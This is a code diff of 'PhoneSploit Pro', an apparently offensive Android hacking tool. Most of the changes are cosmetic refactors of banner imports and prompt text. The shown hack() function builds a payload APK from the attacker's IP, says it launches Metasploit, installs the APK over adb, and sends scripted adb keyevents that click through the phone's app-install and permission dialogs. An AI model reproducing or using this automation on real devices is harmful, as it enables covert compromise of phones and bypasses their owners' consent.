@@ -4,9 +4,7 @@ import socket
 import time
 import subprocess
 import platform
-from banner import banner_list
-from banner import instructions_banner
-from banner import hacking_banner
+from modules import banner
 
 
 def start():
@@ -27,7 +25,8 @@ def check_packages():
         print('\nERROR : ADB is NOT installed!\n')
         print('\nPlease install Android-Tools (adb)\n')
 
-        choice = input('\nDo you still want to continue? [Y / N] > ').lower()
+        choice = input(
+            '\nDo you still want to continue to PhoneSploit Pro? [Y / N] > ').lower()
         if choice == 'y':
             return
         elif choice == 'n':
@@ -48,7 +47,8 @@ def check_packages():
         print('\nERROR : Metasploit-Framework is NOT installed!\n')
         print('\nPlease install Metasploit-Framework\n')
 
-        choice = input('\nDo you still want to continue? [Y / N] > ').lower()
+        choice = input(
+            '\nDo you still want to continue to PhoneSploit Pro? [Y / N] > ').lower()
         if choice == 'y':
             return
         elif choice == 'n':
@@ -73,7 +73,7 @@ def check_packages():
 
 def display_menu():
     ''' Displays a random banner and menu'''
-    print(random.choice(banner_list))  # Prints a random banner
+    print(random.choice(banner.banner_list))  # Prints a random banner
     menu = '''
 
     1. Connect a device             6. Get screenshot                11. Run an app
@@ -268,7 +268,7 @@ def instructions():
     os.system(clear)
     instruction = '''
 
-This attack will launch Metasploit Framework             i.e msfconsole
+This attack will launch Metasploit-Framework             i.e msfconsole
 
 Use 'Ctrl + C' to stop at any point
 
@@ -288,13 +288,13 @@ Use 'Ctrl + C' to stop at any point
      
 [PhoneSploit Pro]   Press 'Enter' to continue attack
     '''
-    print(instructions_banner + instruction)
+    print(banner.instructions_banner + instruction)
     input('> ')
 
 
 def hack():
     instructions()
-    print(hacking_banner)
+    print(banner.hacking_banner)
     ip = get_ip_address()  # getting IP Address to create payload
     print(f"\nUsing IP Address : {ip} to create payload\n")
     print("\nCreating APK...\n")
@@ -307,7 +307,7 @@ def hack():
     time.sleep(5)  # waiting for apk to be installed
 
     # Keyboard input to accept app install
-    print("\nSending input 1\n")
+    print("\nAccepting app install\n")
     os.system('adb shell input keyevent 20')
     os.system('adb shell input keyevent 20')
     os.system('adb shell input keyevent 66')
@@ -318,7 +318,7 @@ def hack():
     time.sleep(3)  # waiting for app to launch
 
     # Keyboard input to accept app permissions
-    print("\nSending input 2\n")
+    print("\nAccepting app permissions\n")
     os.system('adb shell input keyevent 22')
     os.system('adb shell input keyevent 22')
     os.system('adb shell input keyevent 66')
